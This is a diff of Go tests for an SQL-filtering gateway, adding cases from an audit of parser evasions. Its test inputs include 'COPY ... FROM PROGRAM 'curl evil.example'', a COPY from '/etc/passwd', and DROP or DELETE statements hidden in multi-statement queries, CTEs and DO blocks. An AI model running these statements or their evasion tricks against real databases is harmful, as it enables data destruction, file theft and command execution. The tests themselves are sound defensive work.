@@ -11,6 +11,7 @@ import (
 	"github.com/google/go-cmp/cmp"
 
 	"github.com/denoland/clawpatrol/config"
+	"github.com/denoland/clawpatrol/config/match"
 	"github.com/denoland/clawpatrol/config/runtime"
 )
 
@@ -44,13 +45,9 @@ func TestParseSQL(t *testing.T) {
 			},
 		},
 		{
-			// Regex-based extraction is overgreedy by design: it
-			// flags every `<ident>(` callsite, which includes the
-			// table-name + parens (audit (...)) and SQL keywords
-			// like values(. The matcher consumes a list — banned-
-			// function rules check whether their target is anywhere
-			// in the list, so noise is harmless. Caveat: a SQL
-			// parser would be more precise; accepted trade-off.
+			// Tokenizer-based extraction strips string literals and
+			// SQL-keyword "calls" (VALUES, EXISTS, etc.) — the
+			// function list now reflects actual function callsites.
 			"insert with function",
 			"INSERT INTO audit (ts, what) VALUES (now(), 'x')",
 			pgInfo{
@@ -71,15 +68,15 @@ func TestParseSQL(t *testing.T) {
 			},
 		},
 		{
-			// `FROM PROGRAM 'curl ...'` extracts "program" as a
-			// table — also overgreedy and harmless for v14's
-			// `statement = "*COPY*FROM PROGRAM*"` glob, which
-			// matches the raw statement directly.
+			// §2.2: COPY now extracts the actual table (`foo`)
+			// instead of the FROM-following token. `program` shows
+			// up because `from PROGRAM` triggers the FROM table
+			// rule; harmless additional candidate.
 			"COPY ... FROM PROGRAM",
 			"COPY foo FROM PROGRAM 'curl evil.example'",
 			pgInfo{
 				Verb:      "copy",
-				Tables:    []string{"program"},
+				Tables:    []string{"foo", "program"},
 				Functions: nil,
 				Statement: "COPY foo FROM PROGRAM 'curl evil.example'",
 			},
@@ -90,31 +87,41 @@ func TestParseSQL(t *testing.T) {
 			pgInfo{},
 		},
 		{
-			"multi-statement keeps raw statement and first verb",
+			// parseSQL is single-statement (per the ParseStatement
+			// plugin contract); multi-statement Q payloads are
+			// walked by the wire-protocol gateway via analyseAll.
+			// The first top-level statement is what comes back.
+			"multi-statement returns first statement",
 			"SELECT * FROM users; DELETE FROM sessions",
 			pgInfo{
 				Verb:      "select",
-				Tables:    []string{"users", "sessions"},
+				Tables:    []string{"users"},
 				Functions: nil,
-				Statement: "SELECT * FROM users; DELETE FROM sessions",
+				Statement: "SELECT * FROM users",
 			},
 		},
 		{
+			// §2.3: schema-qualified names emit both the qualified
+			// form and the unqualified leaf so rules written either
+			// way still catch the read.
 			"schema-qualified table",
 			"SELECT * FROM audit.secret_tokens",
 			pgInfo{
 				Verb:      "select",
-				Tables:    []string{"audit.secret_tokens"},
+				Tables:    []string{"audit.secret_tokens", "secret_tokens"},
 				Functions: nil,
 				Statement: "SELECT * FROM audit.secret_tokens",
 			},
 		},
 		{
-			"quoted identifier is best-effort only",
+			// §2.4: quoted identifiers are captured with case
+			// preserved, matching postgres' case-sensitive treatment
+			// of "Foo" vs Foo / foo.
+			"quoted identifier is captured case-sensitively",
 			"SELECT * FROM \"Sensitive Table\"",
 			pgInfo{
 				Verb:      "select",
-				Tables:    nil,
+				Tables:    []string{"Sensitive Table"},
 				Functions: nil,
 				Statement: "SELECT * FROM \"Sensitive Table\"",
 			},
@@ -329,6 +336,200 @@ func TestPgClientToServerReturnsOnContextCancel(t *testing.T) {
 	case <-done:
 	case <-time.After(time.Second):
 		t.Fatal("pgClientToServer did not return after context cancellation")
+	}
+}
+
+// TestParseSQL_Audit143 covers the in-scope (FN, evasion) findings
+// from denoland/clawpatrol#143. Each case fires the audit's payload
+// against parseSQL and asserts the matcher input now surfaces the
+// data the evading rule needed.
+//
+// parseSQL is the single-statement front door (ParseStatement
+// plugin entry). Cases that depend on multi-statement /
+// CTE-shadow / DO-shadow evaluation live in
+// TestPgEvaluate_Audit143 below — they need the wire-protocol-side
+// analyseAll walk.
+func TestParseSQL_Audit143(t *testing.T) {
+	cases := []struct {
+		name       string
+		sql        string
+		wantVerb   string
+		wantTables []string
+	}{
+		// §1.1 Trailing-semicolon / no-whitespace verbs no longer
+		// fold the punctuation into the verb token.
+		{"§1.1 BEGIN;", "BEGIN;", "begin", nil},
+		{"§1.1 DROP;", "DROP;", "drop", nil},
+		{"§1.1 SELECT*FROM x", "SELECT*FROM x", "select", []string{"x"}},
+		{"§1.1 DELETE/*c*/FROM x", "DELETE/*c*/FROM x", "delete", []string{"x"}},
+		{"§1.1 SELECT;", "SELECT;", "select", nil},
+
+		// §1.4 Leading comment no longer becomes the verb.
+		{"§1.4 leading -- line comment", "-- whatever\nDROP TABLE users", "drop", []string{"users"}},
+		{"§1.4 leading /* */ block comment", "/* x */ SELECT 1", "select", nil},
+		{"§1.4 /*...*/DROP TABLE users", "/* x */DROP TABLE users", "drop", []string{"users"}},
+
+		// §2.1 Bare-table DDL surfaces the table in `tables`.
+		{"§2.1 DROP TABLE x", "DROP TABLE users", "drop", []string{"users"}},
+		{"§2.1 TRUNCATE TABLE x", "TRUNCATE TABLE users", "truncate", []string{"users"}},
+		{"§2.1 TRUNCATE x (no TABLE)", "TRUNCATE users", "truncate", []string{"users"}},
+		{"§2.1 ALTER TABLE x", "ALTER TABLE users ADD COLUMN x int", "alter", []string{"users"}},
+		{"§2.1 LOCK TABLE x", "LOCK TABLE users", "lock", []string{"users"}},
+		{"§2.1 VACUUM x", "VACUUM users", "vacuum", []string{"users"}},
+		{"§2.1 ANALYZE x", "ANALYZE users", "analyze", []string{"users"}},
+		{"§2.1 REINDEX TABLE x", "REINDEX TABLE users", "reindex", []string{"users"}},
+		{"§2.1 REFRESH MATERIALIZED VIEW x", "REFRESH MATERIALIZED VIEW users_mv", "refresh", []string{"users_mv"}},
+		{"§2.1 CLUSTER x USING idx", "CLUSTER users USING idx", "cluster", []string{"users"}},
+		{"§2.1 COMMENT ON TABLE x", "COMMENT ON TABLE users IS 'x'", "comment", []string{"users"}},
+		{"§2.1 GRANT ALL ON TABLE x", "GRANT ALL ON TABLE users TO bob", "grant", []string{"users"}},
+		{"§2.1 CREATE TABLE x", "CREATE TABLE users (id int)", "create", []string{"users"}},
+		{"§2.1 CREATE TABLE IF NOT EXISTS x", "CREATE TABLE IF NOT EXISTS users (id int)", "create", []string{"users"}},
+		{"§2.1 DROP TABLE IF EXISTS x", "DROP TABLE IF EXISTS users", "drop", []string{"users"}},
+
+		// §2.2 COPY surfaces the source table, not the FROM token.
+		{"§2.2 COPY x FROM stdin", "COPY users FROM stdin", "copy", []string{"users", "stdin"}},
+		{"§2.2 COPY x TO stdout", "COPY users TO stdout", "copy", []string{"users"}},
+		{"§2.2 COPY x(col) FROM 'file'", "COPY users (col1) FROM '/etc/passwd'", "copy", []string{"users"}},
+
+		// §2.3 Schema-qualified names emit both forms.
+		{"§2.3 FROM public.users", "SELECT * FROM public.users", "select", []string{"public.users", "users"}},
+		{"§2.3 DROP TABLE public.users", "DROP TABLE public.users", "drop", []string{"public.users", "users"}},
+
+		// §2.4 Quoted identifiers preserved case-sensitively.
+		{"§2.4 FROM \"Users\"", "SELECT * FROM \"Users\"", "select", []string{"Users"}},
+		{"§2.4 FROM public.\"Users\"", "SELECT * FROM public.\"Users\"", "select", []string{"public.Users", "Users"}},
+
+		// §6.4 SET ROLE / SET SESSION AUTHORIZATION surface as
+		// distinct verbs (sets the table for runtime ID tracking; at
+		// minimum makes CEL `sql.verb == "set role"` precise).
+		{"§6.4 SET ROLE", "SET ROLE admin", "set role", nil},
+		{"§6.4 SET SESSION AUTHORIZATION", "SET SESSION AUTHORIZATION admin", "set session authorization", nil},
+		{"§6.4 SET LOCAL ROLE", "SET LOCAL ROLE admin", "set local role", nil},
+
+		// §1.2 CTE-hidden DML: the OUTER verb is still WITH (the
+		// parser must preserve that — pgEvaluate fans out shadow
+		// sub-statements for the inner mutation); see TestPgEvaluate
+		// for the deny-firing case.
+		{"§1.2 WITH … (DELETE …) SELECT", "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x", "with", []string{"users", "x"}},
+
+		// §6.6 CALL <proc>: verb is `call`, proc name is captured
+		// as a function. Body inspection is out of practical scope
+		// (the proc body lives server-side and isn't on the wire),
+		// but operators can still gate on `function = "..."`.
+		{"§6.6 CALL proc", "CALL my_proc(1, 2)", "call", nil},
+
+		// §2.6 (out of scope but free win): string literals don't
+		// leak as ghost tables now that the tokenizer eats them
+		// first.
+		{"tokenizer ignores FROM inside string", "SELECT 'FROM users'", "select", nil},
+		{"tokenizer ignores DELETE inside dollar quote", "SELECT $tag$ DELETE FROM users $tag$", "select", nil},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := parseSQL(tc.sql)
+			if got.Verb != tc.wantVerb {
+				t.Errorf("Verb = %q, want %q", got.Verb, tc.wantVerb)
+			}
+			if diff := cmp.Diff(tc.wantTables, got.Tables); diff != "" {
+				t.Errorf("Tables mismatch (-want +got):\n%s", diff)
+			}
+		})
+	}
+}
+
+// TestPgEvaluate_Audit143 wires the matcher onto a stub endpoint
+// and exercises the audit's payloads end-to-end — the dial-tone
+// path the wire-protocol gateway uses. Covers the multi-statement
+// / CTE-shadow / DO-shadow evasions that parseSQL alone can't
+// (those need analyseAll to fan out).
+func TestPgEvaluate_Audit143(t *testing.T) {
+	denyAll := func(rule *config.CompiledRule) *runtime.ConnHandle {
+		return &runtime.ConnHandle{
+			Endpoint: &config.CompiledEndpoint{
+				Name:   "pg-test",
+				Family: "sql",
+				Rules:  []*config.CompiledRule{rule},
+			},
+			Emit: func(runtime.ConnEvent) {},
+		}
+	}
+
+	denyRule := func(reason string) *config.CompiledRule {
+		// Compile a rule that matches everything (PassThrough) and
+		// denies. Real rules would have a CEL match predicate, but
+		// for these wiring tests the matcher firing on every input
+		// is exactly what we want — the audit is about the *parser*
+		// surfacing the inner statement so a real rule would fire,
+		// which we model as "the inner walk reaches the matcher at
+		// all."
+		return &config.CompiledRule{
+			Name:    "deny-all",
+			Matcher: passThrough{},
+			Outcome: config.Outcome{Verdict: "deny", Reason: reason},
+		}
+	}
+
+	cases := []struct {
+		name string
+		sql  string
+		// wantDeny: every case here must produce a deny verdict
+		// because the inner walk reaches the matcher.
+	}{
+		// §1.3 Multi-statement Simple Query: each ;-statement is
+		// walked, so a DELETE / DROP buried after a SELECT no longer
+		// hides behind the first verb.
+		{"§1.3 SELECT 1; DROP TABLE users", "SELECT 1; DROP TABLE users"},
+		{"§1.3 SELECT 1; INSERT INTO admins", "SELECT 1; INSERT INTO admins(uid) VALUES (1)"},
+		{"§1.3 BEGIN; DROP TABLE users; COMMIT", "BEGIN; DROP TABLE users; COMMIT"},
+
+		// §1.2 CTE-hidden DML: the inner DELETE / UPDATE is a
+		// shadow statement that hits the matcher.
+		{"§1.2 WITH (DELETE …) SELECT", "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x"},
+		{"§1.2 WITH (UPDATE …) SELECT", "WITH d AS (UPDATE accounts SET balance = 0 RETURNING *) SELECT count(*) FROM d"},
+
+		// §6.5 DO body: inner DROP is a shadow statement.
+		{"§6.5 DO $$ DROP TABLE users $$", "DO $$ BEGIN DROP TABLE users; END $$"},
+
+		// §6.4 + §1.3 compose: SET ROLE then DROP in one Q.
+		{"§6.4 + §1.3", "SET ROLE admin; DROP TABLE users"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			ch := denyAll(denyRule("blocked"))
+			v, _ := pgEvaluate(ch, tc.sql, "")
+			if v != "deny" {
+				t.Errorf("pgEvaluate(%q) verdict = %q, want deny", tc.sql, v)
+			}
+		})
+	}
+}
+
+// passThrough is a match.Matcher that fires on every request — used
+// in TestPgEvaluate_Audit143 to model "if the parser surfaces this
+// statement to the matcher at all, the matcher will fire."
+type passThrough struct{}
+
+func (passThrough) Match(*match.Request) bool { return true }
+
+// TestPgClientToServerDeniesFunctionCall closes §4.1's FunctionCall
+// blind spot: the legacy 'F' fast-path carries no SQL text, so the
+// gateway fails closed.
+func TestPgClientToServerDeniesFunctionCall(t *testing.T) {
+	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
+	defer cleanup()
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
+
+	wire := serializePgMessage(pgMessage{typ: 'F', payload: []byte{0, 0, 0, 1, 0, 0}})
+	go func() { _, _ = agent.Write(wire) }()
+	_ = readFullWithDeadline(t, agent, 5) // ErrorResponse header
+
+	_ = upstreamPeer.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
+	buf := make([]byte, 1)
+	if n, err := upstreamPeer.Read(buf); err == nil || n != 0 {
+		t.Fatalf("upstream received FunctionCall bytes: n=%d err=%v", n, err)
 	}
 }
 
